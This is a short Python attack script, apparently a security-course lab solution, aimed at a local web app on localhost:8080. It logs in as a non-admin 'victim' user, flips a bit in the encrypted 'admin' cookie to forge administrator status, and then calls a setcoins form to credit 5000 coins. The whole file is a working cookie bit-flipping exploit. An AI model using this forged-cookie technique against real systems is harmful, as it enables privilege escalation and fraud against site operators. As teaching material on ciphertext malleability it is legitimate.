from requests import codes, Session

LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

def do_login_form(sess, username,password):
	data_dict = {"username":username,\
			"password":password,\
			"login":"Login"
			}
	response = sess.post(LOGIN_FORM_URL,data_dict)
	return response.status_code == codes.ok

def do_setcoins_form(sess,uname, coins):
	data_dict = {"username":uname,\
			"amount":str(coins),\
			}
	response = sess.post(SETCOINS_FORM_URL, data_dict)
	return response.status_code == codes.ok


def do_attack():
	sess = Session()
  #you'll need to change this to a non-admin user, such as 'victim'.
	uname ="victim"
	pw = "victim"
	assert(do_login_form(sess, uname,pw))
	#Maul the admin cookie in the 'sess' object here
	print("Original admin cookie:", sess.cookies.items()[0])

	admin_cookie = bytearray(bytes.fromhex(sess.cookies.items()[0][1]))
	sess_cookie = bytearray(bytes.fromhex(sess.cookies.items()[1][1]))

	# flipping the bit
	admin_cookie[0] =  admin_cookie[0] ^ 0x01
	print("Manipulated admin cookie:", admin_cookie.hex())


	sess.cookies.clear()

	sess.cookies.set('admin', admin_cookie.hex())
	sess.cookies.set('session', sess_cookie.hex())
	print("Final cookie jar:",sess.cookies.items())

	
	target_uname = uname
	amount = 5000
	result = do_setcoins_form(sess, target_uname,amount)
	print("Attack successful? " + str(result))


if __name__=='__main__':
	do_attack()
